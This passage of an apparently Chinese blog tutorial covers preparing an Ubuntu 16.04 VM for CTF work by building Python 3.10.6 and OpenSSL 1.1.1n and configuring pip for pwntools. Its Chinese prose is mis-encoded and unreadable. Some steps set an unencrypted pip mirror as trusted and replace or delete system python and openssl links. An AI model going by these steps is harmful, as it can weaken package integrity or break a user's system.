punctuation">(</span>total<span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/Could not fetch URL https://pypi.tuna.tsinghua.edu.cn/simple/pwn/: There was a problem confirming the ssl certificate: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pypi.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /simple/pwn/ <span class="token punctuation">(</span>Caused by SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:645)'</span><span class="token punctuation">)</span>,<span class="token punctuation">))</span> - skipping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯å°è¯•æ›´æ¢ pip æºï¼Œè¿™é€šå¸¸æ˜¯å› ä¸º Ubuntu 16.04 è¿™ç§è€ç‰ˆæœ¬ä½¿ç”¨æ¸…åæºå¯¼è‡´çš„</p><p>ä¾‹å¦‚å°†æ¸…åæºæ¢æˆé˜¿é‡Œæºï¼Œæ›´æ”¹ <code>~/.config/pip/pip.conf</code> æ–‡ä»¶å†…å®¹ï¼Œç¤ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> http://mirrors.aliyun.com/pypi/simple/<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host <span class="token operator">=</span> mirrors.aliyun.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-python-3-10-6"><a href="#å®‰è£…-python-3-10-6" class="headerlink" title="å®‰è£… python 3.10.6"></a>å®‰è£… python 3.10.6</h2><blockquote><p>ç”±äº Ubuntu 16.04 è‡ªå¸¦çš„ python 3.5 å¤ªè€äº†ï¼Œpip é»˜è®¤ç‰ˆæœ¬åªæœ‰ 8ï¼Œæ˜¯æ— æ³•ç›´æ¥å®‰è£… pwntools çš„ï¼Œä¹Ÿä¼šå­˜åœ¨å…¶ä»–çš„ç‰ˆæœ¬é—®é¢˜ï¼Œç´¢æ€§ç›´æ¥å®‰è£…ä¸€ä¸ªæ–°ä¸€ç‚¹çš„ python 3.10.6</p><p><em>ä½†æ˜¯å®‰è£…è¿‡ç¨‹ä¹Ÿä¸æ˜¯ä¸€å¸†é£é¡ºçš„ï¼Œé‡åˆ°äº†å„ç§å„æ ·çš„ bugï¼Œä¸‹é¢ä¼šå…·ä½“åˆ†æå’Œè§£å†³</em></p><p><em>å¦‚æœå›¾æ–¹ä¾¿å’Œç¨³å®šï¼Œå°±å®‰è£… python 3.9 åŠä»¥ä¸‹çš„ç‰ˆæœ¬å§ï¼Œè¯•äº†ä¸€æ¬¡å¥½åƒæ²¡ä»€ä¹ˆ bug ï¼ˆè‡³å°‘æ²¡æœ‰ SSL é—®é¢˜ï¼‰</em></p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://blog.csdn.net/weixin_44132990/article/details/126308573">Ubuntuå®‰è£…python3.10.6-CSDNåšå®¢</a></p></blockquote><p>å®‰è£…ç›¸å…³åº“ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å®‰è£…ä¾èµ–ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹è½½å¹¶è§£å‹ python 3.10.6 æºç ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.python.org/ftp/python/3.10.6/Python-3.10.6.tgz<span class="token function">tar</span> <span class="token parameter variable">-vxf</span> Python-3.10.6.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç¼–è¯‘å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix æŒ‡å®šå®‰è£…çš„ç›®å½•ï¼Œæˆ‘è¿™é‡Œå®‰è£…åœ¨ /usr/local/python3.10.6 ä¸‹</span><span class="token comment"># --enable-optimizations å¯¹ç¼–è¯‘ç»“æœè¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™é‡Œå®‰è£…ä½¿ç”¨çš„æ˜¯ <code>sudo make altinstall</code> è€Œä¸æ˜¯ <code>sudo make install</code> ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ï¼‰<br>ä½¿ç”¨ <code>sudo make install</code> å¯èƒ½ä¼šæ›´æ”¹è‡ªå¸¦çš„ python3 å®‰è£…ï¼Œä½¿å¸è½½å˜å¾—å›°éš¾ï¼Œç”šè‡³ä½¿è‡ªå¸¦çš„ python3 å˜å¾—ä¸å¯ç”¨ï¼Œä½†ä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™äº›æ¶æ€§é”™è¯¯</p></blockquote><hr><h3 id="è¸©å‘ä¸è§£å†³"><a href="#è¸©å‘ä¸è§£å†³" class="headerlink" title="è¸©å‘ä¸è§£å†³"></a>è¸©å‘ä¸è§£å†³</h3><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://blog.csdn.net/qq_39719415/article/details/121361399">python3çš„å®‰è£…ï¼ˆè¸©å‘ç‰ˆï¼Œè§£å†³sslé—®é¢˜ï¼Œè§£å†³pip3æ— æ³•ä½¿ç”¨çš„é—®é¢˜ï¼‰python3 å®‰è£…sslæ¨¡å—-CSDNåšå®¢</a></li><li><a href="https://blog.csdn.net/mdh17322249/article/details/123966953">python3.10ç¼–è¯‘å®‰è£…æŠ¥SSLå¤±è´¥è§£å†³æ–¹æ³•_pythonæºç ç¼–è¯‘çš„æ—¶å€™ â€” logging error â€” got an error: -CSDNåšå®¢</a></li><li><a href="https://blog.csdn.net/u011573853/article/details/107243183">The necessary bits to build these optional modules were not found: _uuid _bz2 _curse _curses_panel-CSDNåšå®¢</a></li></ol></blockquote><p>å®‰è£… python 3.10.6 åœ¨ <code>make</code> ç¼–è¯‘çš„æœ€åä¼šæŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The necessary bits to build these optional modules were not found:  _lzma                 _uuid                                      To <span class="token function">find</span> the necessary bits, <span class="token function">look</span> <span class="token keyword">in</span> setup.py <span class="token keyword">in</span> detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> the module's name.      The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have been  built by the Makefile instead, as configured by the Setup files:  _abc                  <span class="token builtin class-name">pwd</span>                   <span class="token function">time</span>                     Failed to build these modules:  _hashlib              _ssl                                           Could not build the ssl module<span class="token operator">!</span>  Python requires a OpenSSL <span class="token number">1.1</span>.1 or newer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸå› åœ¨äº python 3.10 ä¾èµ–çš„ OpenSSL å¿…é¡»è¦æ˜¯ 1.1.1 ä¹‹åçš„ç‰ˆæœ¬ï¼Œæˆ–è€…å®‰è£…äº† 2.6.4 ä¹‹åçš„ libresslï¼Œlinux è‡ªå¸¦çš„ OpenSSL ç‰ˆæœ¬è¿‡ä½ï¼ŒåŒæ—¶è¿˜æ˜¾ç¤ºç¼ºå°‘ <code>_lzma</code> å’Œ <code>_uuid</code></p><hr><h4 id="ç¼–è¯‘å®‰è£…-OpenSSL-1-1-1n"><a href="#ç¼–è¯‘å®‰è£…-OpenSSL-1-1-1n" class="headerlink" title="ç¼–è¯‘å®‰è£… OpenSSL 1.1.1n"></a>ç¼–è¯‘å®‰è£… <code>OpenSSL 1.1.1n</code></h4><p>ä¸‹è½½ï¼š<a href="https://www.openssl.org/source/openssl-1.1.1n.tar.gz" title="https://www.openssl.org/source/openssl-1.1.1n.tar.gz">https://www.openssl.org/source/openssl-1.1.1n.tar.gz</a></p><p>è§£å‹å¹¶ç¼–è¯‘ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.openssl.org/source/openssl-1.1.1n.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> openssl-1.1.1n.tar.gz<span class="token builtin class-name">cd</span> openssl-1.1.1n<span class="token function">sudo</span> ./config <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/openssl<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹é“¾æ¥æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¤‡ä»½åŸæœ‰é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/bin/openssl /usr/bin/openssl.bak <span class="token comment"># åˆ›å»ºè½¯é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/local/openssl/bin/openssl /usr/bin/openssl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ è·¯å¾„è‡³ <code>ld.so.conf</code>ï¼š ï¼ˆæ³¨æ„è·¯å¾„æœ€åä¸èƒ½å¸¦ <code>&#39;/&#39;</code>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span>   <span class="token comment"># å…ˆè¿›å…¥ root è´¦æˆ·ï¼Œå¦åˆ™ä¸‹é¢ä¸€æ¡è¯­å¥ä¼šæŠ¥æƒé™é—®é¢˜çš„é”™è¯¯</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/openssl/lib"</span> <span class="token operator">>></span> /etc/ld.so.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŸ¥çœ‹è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹ OpenSSL ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl version<span class="token comment"># è¾“å‡ºï¼š</span>OpenSSL <span class="token number">1.1</span>.1n  <span class="token number">15</span> Mar <span class="token number">2022</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ python 3.10.6 ç¼–è¯‘æºæ–‡ä»¶çš„ <code>Setup</code> ä¸­çš„é“¾æ¥ï¼Œè·¯å¾„ä½äºï¼š<code>Python-3.10.6/Modules/Setup</code></p><p>åœ¨ <code>Setup</code> ä¸­æ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼Œå¯ç›´æ¥æœç´¢ <code>&#39;OPENSSL&#39;</code> ï¼ˆå¤§æ¦‚ä½äºç¬¬ 211 è¡Œï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Socket module helper for SSL support; you must comment out the other</span><span class="token comment"># socket line above, and edit the OPENSSL variable:</span> <span class="token assign-left variable">OPENSSL</span><span class="token operator">=</span>/usr/local/openssl _ssl _ssl.c <span class="token punctuation">\</span>     -I<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/include -L<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/lib <span class="token punctuation">\</span>     <span class="token parameter variable">-lssl</span> <span class="token parameter variable">-lcrypto</span><span class="token comment">#_hashlib _hashopenssl.c \</span><span class="token comment">#     -I$(OPENSSL)/include -L$(OPENSSL)/lib \</span><span class="token comment">#     -lcrypto</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ä¸­é—´è¿™å››å¥å–æ¶ˆæ³¨é‡Šï¼Œå¹¶<strong>å°† OpenSSL çš„å®‰è£…è·¯å¾„å¡«å…¥ <code>OPENSSL=</code> åé¢</strong> <em>ï¼ˆå…¶ä»–åœ°æ–¹éƒ½ä¸éœ€è¦æ”¹åŠ¨ï¼Œå¯èƒ½ Setup çš„å†…å®¹æœ‰äº›åŒºåˆ«ï¼Œä»¥è‡ªå·±çš„ä¸ºä¸»ï¼‰</em>ï¼š</p><p>ä¿å­˜ <code>Setup</code> æ–‡ä»¶</p><hr><h4 id="å®‰è£…-lzma-å’Œ-uuid"><a href="#å®‰è£…-lzma-å’Œ-uuid" class="headerlink" title="å®‰è£… _lzma å’Œ _uuid"></a>å®‰è£… <code>_lzma</code> å’Œ <code>_uuid</code></h4><p>ç›´æ¥ä¸€æ¬¡æ€§å®‰è£…å…¨éƒ¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h4 id="å†æ¬¡ç¼–è¯‘å®‰è£…-python"><a href="#å†æ¬¡ç¼–è¯‘å®‰è£…-python" class="headerlink" title="å†æ¬¡ç¼–è¯‘å®‰è£… python"></a>å†æ¬¡ç¼–è¯‘å®‰è£… python</h4><p>æœ€åï¼Œé‡æ–°ç¼–è¯‘å®‰è£… python 3.10.6ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix æŒ‡å®šå®‰è£…çš„ç›®å½•ï¼Œæˆ‘è¿™é‡Œå®‰è£…åœ¨ /usr/local/python3.10.6 ä¸‹</span><span class="token comment"># --enable-optimizations å¯¹ç¼–è¯‘ç»“æœè¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶ <code>make</code> ç¼–è¯‘æœ€åæ˜¾ç¤ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have beenbuilt by the Makefile instead, as configured by the Setup files:_abc                  _ssl                  <span class="token builtin class-name">pwd</span>                <span class="token function">time</span>                                                           Failed to build these modules:_hashlib  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_hashlib</code> æ˜¯ OpenSSL ç”¨äºæ”¯æŒå“ˆå¸ŒåŠ å¯†çš„æ¨¡å—ä¹‹ä¸€ï¼Œç”±äºæˆ‘ä»¬æ‰‹åŠ¨ç¼–è¯‘å®‰è£…äº† <code>OpenSSL 1.1.1n</code>ï¼Œå¿½ç•¥å³å¯</p><p>å®‰è£…å®Œåï¼Œç»ˆç«¯è¾“å…¥ <code>python3.10</code> å³å¯æ‰“å¼€ python3.10.6 çš„ç•Œé¢</p><p>pip3 ä¹Ÿä¼šè‡ªåŠ¨å®‰è£…å¥½ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º8.png"></p><p>å¦‚æœå‡ºç°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: The script pip3.10 is installed <span class="token keyword">in</span> <span class="token string">'/usr/local/python3.10.6/bin'</span> <span class="token function">which</span> is not on <span class="token environment constant">PATH</span><span class="token builtin class-name">.</span>Consider adding this directory to <span class="token environment constant">PATH</span> or, <span class="token keyword">if</span> you prefer to suppress this warning, use --no-warn-script-location.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è§£å†³åŠæ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ³¨æ„, PATH çš„å†…å®¹è¦ä¸ä¸Šè¿° WARNING ä¸­çš„è·¯å¾„ä¸€è‡´</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/usr/local/python3.10.6/bin:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>éªŒè¯å®‰è£…ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º9.png"></p><p>æŸ¥çœ‹å®‰è£…è·¯å¾„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA13.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º13.png"></p><p>é˜²æ­¢åç»­å®‰è£… Pwntools æ—¶å‘ç”ŸæŠ¥é”™ï¼Œè¿˜éœ€è¦åœ¨ <code>/usr/local/python3.10.6</code>ï¼ˆä»¥è‡ªå·±å®é™…å®‰è£…è·¯å¾„ä¸ºä¸»ï¼‰ä¸‹å»ºç«‹ä¸€ä¸ª pip çš„è½¯è¿æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/local/python3.10.6/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒæ—¶ï¼Œæ­¤æ—¶ <code>python3.10</code> å’Œ <code>pip3.10</code> æ˜¯ä¸å¯ä»¥åœ¨ <code>sudo</code> ä¸‹è¿è¡Œçš„ï¼ŒåŠ å…¥è½¯é“¾æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python3.10<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ°æ­¤ï¼Œå¤§åŠŸå‘Šæˆï¼å®Œç¾ï¼</p><hr><h3 id="è®¾ç½®é»˜è®¤-python-å’Œ-pip-ç‰ˆæœ¬"><a href="#è®¾ç½®é»˜è®¤-python-å’Œ-pip-ç‰ˆæœ¬" class="headerlink" title="è®¾ç½®é»˜è®¤ python å’Œ pip ç‰ˆæœ¬"></a>è®¾ç½®é»˜è®¤ python å’Œ pip ç‰ˆæœ¬</h3><p>è®¾ç½®é»˜è®¤ python ç‰ˆæœ¬ä¸º python 3.10.6ï¼Œé»˜è®¤ pip ç‰ˆæœ¬ä¸º pip-22.2.1 ï¼ˆpython 3.10.6ï¼‰</p><ol><li>é€šè¿‡ä¿®æ”¹è½¯è¿æ¥ï¼š</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># åˆ é™¤åŸæœ‰çš„è½¯é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/pip<span class="token comment"># è®¾ç½®è½¯è¿æ¥</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>é€šè¿‡æ›´æ”¹ <code>.bashrc</code>ï¼š</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">python</span><span class="token operator">=</span>python3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">pip</span><span class="token operator">=</span>pip3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>æç¤ºï¼š</strong><br><strong>å°½é‡ä¸è¦æ›´æ”¹ python3 çš„é»˜è®¤ç‰ˆæœ¬ï¼Œpython3 é»˜è®¤æŒ‡å‘ python 3.5ï¼Œå› ä¸º Ubuntu 16.04 æŸäº›è®¾ç½®å¯èƒ½ä¼šç”¨åˆ° python 3.5ï¼Œæ›´æ”¹å¯èƒ½ä¼šå‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</strong></p><blockquote><p>æ³¨æ„ï¼š<code>/usr/local/python3.10.6</code> è¿™ä¸ªåœ°å€æ˜¯å®‰è£…å python 3.10.6 çš„è·¯å¾„ï¼Œè§†è‡ªå·±çš„æƒ…å†µè€Œå®š </p><p>python 3.10.6 çš„è·¯å¾„å¯ä»¥é€šè¿‡ <code>which python3.10</code> æ¥æŸ¥çœ‹</p></blockquote><hr><h2 id="å®‰è£…-python-3-9-åŠä»¥ä¸‹ç‰ˆæœ¬"><a href="#å®‰è£…-python-3-9-åŠä»¥ä¸‹ç‰ˆæœ¬" class="headerlink" title="å®‰è£… python 3.9 åŠä»¥ä¸‹ç‰ˆæœ¬"></a>å®‰è£… python 3.9 åŠä»¥ä¸‹ç‰ˆæœ¬</h2><blockquote><p>ä»¥ python 3.9.13 ä¸ºä¾‹ï¼Œè¿™ä¸ªç‰ˆæœ¬å°±æ²¡æœ‰ python 3.10 é‚£ä¹ˆéº»çƒ¦äº†</p></blockquote><p>å®‰è£…ç›¸å…³åº“ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å®‰è£…ä¾èµ–ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹è½½ï¼š<a href="https://www.python.org/ftp/python/3.9.13/Python-3.9.13.tgz">Python Release Python 3.9.13 | Python.org</a></p><p>è§£å‹å¹¶ç¼–è¯‘å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> Python-3.9.13.tgz<span class="token builtin class-name">cd</span> Python-3.9.13<span class="token comment"># --prefix æŒ‡å®šå®‰è£…çš„ç›®å½•ï¼Œæˆ‘è¿™é‡Œå®‰è£…åœ¨ /usr/local/python3.9 ä¸‹</span><span class="token comment"># --with-pydebug æ·»åŠ è°ƒè¯•å·¥å…·</span><span class="token comment"># --enable-optimizations å¯¹ç¼–è¯‘ç»“æœè¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.9 --with-pydebug --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é…ç½® python 3.9.13 å’Œ pip 3.9ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/python3.9  /usr/bin/python3.9$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/pip3.9  /usr/bin/pip3.9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœå‡ºç°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The directory <span class="token string">'/home/wyy/.cache/pip/http'</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want <span class="token function">sudo</span><span class="token string">'s -H flag.The directory '</span>/home/wyy/.cache/pip<span class="token string">' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo'</span>s <span class="token parameter variable">-H</span> flag.<span aria-hidden="true" 